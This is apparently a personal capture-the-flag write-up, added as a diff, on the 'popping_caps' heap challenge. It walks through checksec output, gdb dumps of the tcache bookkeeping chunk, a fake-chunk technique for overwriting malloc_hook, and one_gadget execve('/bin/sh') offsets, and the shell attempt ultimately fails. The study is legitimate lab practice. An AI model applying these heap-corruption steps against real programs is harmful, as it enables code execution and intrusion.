@@ -310,3 +310,201 @@ constraints:
 I tried to write a pseudo gadget to set the values, to no avail. As the tutorial suggests, I will try to call `system` instead.
 
 The overwrite succeeded, but I was not able to pop a shell. After following a bit the flow of instruction, it seems that the `system` clones a process, and somehow I don't have the control over it.
+
+It's a failure :/
+
+# Popping Cap 0
+
+```bash
+❯ file popping_caps
+popping_caps: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0b94b47318011a2516372524e7aaa0caeda06c79, not stripped
+❯ checksec popping_caps
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+Classic heap exercise, with Malloc, Free and Write. Somehow I'm releaved to see a write, since the previous exercise was... tiresome. There is even a system leak on the go !
+
+The program seems to have a counter initialised at 7, which is decremented at each menu entry. Obviously, I have 7 tries to open a shell.
+
+## Malloc
+
+It seems to ask for any size and allocate it. It will then save the address in a variable that lives on the stack.
+
+## Free
+
+Reads a number from the user, and frees anything that is at latest malloc'ed address plus the number from the user. Then under a certain condition it will set a pointer to the heap to null. This might be to prevent us from writing over this freed address, since it is this variable that is used for writing.
+
+Since the delta computation will be relative to the latest malloc'ed address, we'll need to provide a negative delta in order to free previous entries.
+
+## Write
+
+Reads 8 bytes from stdin, and write it a the copied variable, which is supposed to be the latest allocated chunk
+
+## Bye
+
+This method will print `Bye!`, then malloc `0x38` before exiting. It is called if we select option `4`, or if we use up our 7 interactions with the menu. It might be useful if we try to overwrite malloc_hook with our 7 interactions, and need a final malloc to trigger an exploit.
+
+## Exploit
+
+I first tried to double free a chunk in the hope to be able to overwrite an fd pointer before reallocating it.
+
+I then followed the tutorial in order to press forward.
+
+### About tcache
+
+In this exercise, the author explains how libc is bookkeeping the different freed chunks.
+
+With gdb I can see an allocated chunk of about 0x290 bytes before allocating any of the chunks I requested.
+
+Upon closer inspection, we can see some connections with some previous `free` I just did:
+```
+gef➤  x/100gx 0x0000560732358000
+0x560732358000:	0x0000000000000000	0x0000000000000291  <header of the automatically allocated chunk>
+0x560732358010:	0x0000000000000003	0x0000000000000000  <counter for chunks of size 0x20>
+0x560732358020:	0x0000000000000000	0x0000000000000000
+0x560732358030:	0x0000000000000000	0x0000000000000000
+0x560732358040:	0x0000000000000000	0x0000000000000000
+0x560732358050:	0x0000000000000000	0x0000000000000000
+0x560732358060:	0x0000000000000000	0x0000000000000000
+0x560732358070:	0x0000000000000000	0x0000000000000000
+0x560732358080:	0x0000000000000000	0x0000000000000000
+0x560732358090:	0x00005607323582e0	0x0000000000000000  <pointer to last entry in freed chunk of size 0x20>
+0x5607323580a0:	0x0000000000000000	0x0000000000000000
+0x5607323580b0:	0x0000000000000000	0x0000000000000000
+0x5607323580c0:	0x0000000000000000	0x0000000000000000
+0x5607323580d0:	0x0000000000000000	0x0000000000000000
+0x5607323580e0:	0x0000000000000000	0x0000000000000000
+0x5607323580f0:	0x0000000000000000	0x0000000000000000
+0x560732358100:	0x0000000000000000	0x0000000000000000
+0x560732358110:	0x0000000000000000	0x0000000000000000
+0x560732358120:	0x0000000000000000	0x0000000000000000
+0x560732358130:	0x0000000000000000	0x0000000000000000
+0x560732358140:	0x0000000000000000	0x0000000000000000
+0x560732358150:	0x0000000000000000	0x0000000000000000
+0x560732358160:	0x0000000000000000	0x0000000000000000
+0x560732358170:	0x0000000000000000	0x0000000000000000
+0x560732358180:	0x0000000000000000	0x0000000000000000
+0x560732358190:	0x0000000000000000	0x0000000000000000
+0x5607323581a0:	0x0000000000000000	0x0000000000000000
+0x5607323581b0:	0x0000000000000000	0x0000000000000000
+0x5607323581c0:	0x0000000000000000	0x0000000000000000
+0x5607323581d0:	0x0000000000000000	0x0000000000000000
+0x5607323581e0:	0x0000000000000000	0x0000000000000000
+0x5607323581f0:	0x0000000000000000	0x0000000000000000
+0x560732358200:	0x0000000000000000	0x0000000000000000
+0x560732358210:	0x0000000000000000	0x0000000000000000
+0x560732358220:	0x0000000000000000	0x0000000000000000
+0x560732358230:	0x0000000000000000	0x0000000000000000
+0x560732358240:	0x0000000000000000	0x0000000000000000
+0x560732358250:	0x0000000000000000	0x0000000000000000
+0x560732358260:	0x0000000000000000	0x0000000000000000
+0x560732358270:	0x0000000000000000	0x0000000000000000
+0x560732358280:	0x0000000000000000	0x0000000000000000
+0x560732358290:	0x0000000000000000	0x0000000000000021  <first freed chunk>
+0x5607323582a0:	0x0000000000000000	0x0000560732358010
+0x5607323582b0:	0x0000000000000000	0x0000000000000021  <chunk freed in second>
+0x5607323582c0:	0x00005607323582a0	0x0000560732358010
+0x5607323582d0:	0x0000000000000000	0x0000000000000021  <last freed chunk>
+0x5607323582e0:	0x00005607323582c0	0x0000560732358010  <pointer to previous, pointer to bookkeeping region (counter)>
+0x5607323582f0:	0x0000000000000000	0x0000000000020d11
+```
+
+With this bookkeeping information combined with the weird free mechanism in this exercise where we can use a negative delta, I guess we'll have to free the bookkeeping chunk in order to exploit this executable.
+
+BTW the counter goes like this:
+* `0x20` chunk:
+```
+0x55dea8235000:	0x0000000000000000	0x0000000000000291
+0x55dea8235010:	0x0000000000000001	0x0000000000000000
+0x55dea8235020:	0x0000000000000000	0x0000000000000000
+```
+
+* `0x30`, `0x40`, `0x50` chunk:
+```
+0x55bea4285000:	0x0000000000000000	0x0000000000000291
+0x55bea4285010:	0x0001000100010000	0x0000000000000000
+0x55bea4285020:	0x0000000000000000	0x0000000000000000
+```
+
+So each word seems to hold a counter for 4 different sizes.
+
+* `0x20` chunk twice:
+```
+0x558ad9930000:	0x0000000000000000	0x0000000000000291
+0x558ad9930010:	0x0000000000000002	0x0000000000000000
+0x558ad9930020:	0x0000000000000000	0x0000000000000000
+```
+
+And it seems to be simply incremented.
+
+However, it seems the space used for each counter is different from 2.31 and 2.27. With 2.31 I'm not able to get a `1` at the right place, so I will try to use libc2.27 instead. (with patchelf)
+
+With libc2.27 I'm able to create a fake chunk, as per the tutorial:
+```
+0x561a79597000:	0x0000000000000000	0x0000000000000251  <bookkeeping chunk's header, see the size is different from 2.31>
+0x561a79597010:	0x0000000000000000	0x0001000000000000  <counter for chunk of size 0x100 (fake one)>
+0x561a79597020:	0x0000000000000000	0x0000000000000000
+0x561a79597030:	0x0000000000000000	0x0000000000000000
+0x561a79597040:	0x0000000000000000	0x0000000000000100  <counter for chunk of size 0x3b0, which we use as a header for a fake chunk>
+0x561a79597050:	0x0000000000000000	0x0000000000000000
+0x561a79597060:	0x0000000000000000	0x0000000000000000
+0x561a79597070:	0x0000000000000000	0x0000000000000000
+0x561a79597080:	0x0000000000000000	0x0000000000000000
+0x561a79597090:	0x0000000000000000	0x0000000000000000
+0x561a795970a0:	0x0000000000000000	0x0000000000000000
+0x561a795970b0:	0x0000000000000000	0x0000000000000000
+0x561a795970c0:	0x0000561a79597050	0x0000000000000000  <for pointer for linked list>
+0x561a795970d0:	0x0000000000000000	0x0000000000000000
+...
+```
+```
+gef➤  heap bins
+──────────────────────────────── Tcachebins for arena 0x7f567bf75c40 ────────────────────────────────
+Tcachebins[idx=14, size=0x100] count=1  ←  Chunk(addr=0x561a79597050, size=0x100, flags=)
+```
+
+We will now allocate this chunk, and then write malloc hook's address at its first 8 bytes. It will now look like this:
+```
+gef➤  x/100gx 0x00005576971b7000
+0x5576971b7000:	0x0000000000000000	0x0000000000000251  <bookkeeping chunk's header>
+0x5576971b7010:	0x0000000000000000	0x0000000000000000
+0x5576971b7020:	0x0000000000000000	0x0000000000000000
+0x5576971b7030:	0x0000000000000000	0x0000000000000000
+0x5576971b7040:	0x0000000000000000	0x0000000000000100  <fake chunk>
+0x5576971b7050:	0x00007f79a16a0c30	0x0000000000000000  <pointer of the next free chunk, which points to malloc_hook>
+0x5576971b7060:	0x0000000000000000	0x0000000000000000
+0x5576971b7070:	0x0000000000000000	0x0000000000000000
+```
+And:
+```
+gef➤  heap bins
+──────────────────────────────── Tcachebins for arena 0x7f79a16a0c40 ────────────────────────────────
+Tcachebins[idx=0, size=0x20] count=0  ←  Chunk(addr=0x7f79a16a0c30, size=0x7f79a134d790, flags=) 
+```
+
+Now all we have to do is allocate this free chunk, write a system address and exit the program (which will call malloc).
+
+We're going to write a onegadget at malloc_hook, which we can choose from:
+```
+❯ one_gadget libc-2.27.so
+0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+
+0x4f322 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a38c execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+```
+
+Unfortunatly, it seems that none of the constraints are fullfilled with my host, nor with my ubuntu16.04 VM. I probably need to install one for each version of libc...
+
+Well, at least I grasped the bookkeeping part of tcache, right ?
